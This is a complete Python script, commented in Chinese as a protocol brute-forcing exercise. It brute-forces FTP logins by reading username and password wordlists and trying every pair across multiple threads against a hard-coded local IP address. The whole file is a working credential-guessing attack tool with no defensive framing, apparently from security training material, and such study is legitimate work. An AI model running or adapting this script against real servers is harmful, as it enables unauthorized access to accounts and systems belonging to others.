import ftplib
import threading
import queue
import sys

#利用Python开发其他协议爆破脚本
def ftp_check():
    while not q.empty():
        dict=q.get()
        dict=dict.split('|')
        username=dict[0]
        password=dict[1]
        ftp=ftplib.FTP()
        try:
            ftp.connect('192.168.0.101',21)
            ftp.login(username,password)
            ftp.retrlines('list')
            ftp.close()
            print('success|'+username+'|'+password)
        except ftplib.all_errors:
            print('failed|'+username+'|'+password)
            ftp.close()
            pass


if __name__ == '__main__':
    print("python ftp_burte.py user.txt pass.txt 10")
    user_file=sys.argv[1]
    pass_file = sys.argv[2]
    thread_x=sys.argv[3]
    q=queue.Queue()
    for username in open(user_file):
        for password in open(pass_file):
            username = username.replace('\n', '')
            password = password.replace('\n', '')
            diclist=username+'|'+password
            q.put(diclist)
    for x in range(int(thread_x)):
        t=threading.Thread(target=ftp_check)
        t.start()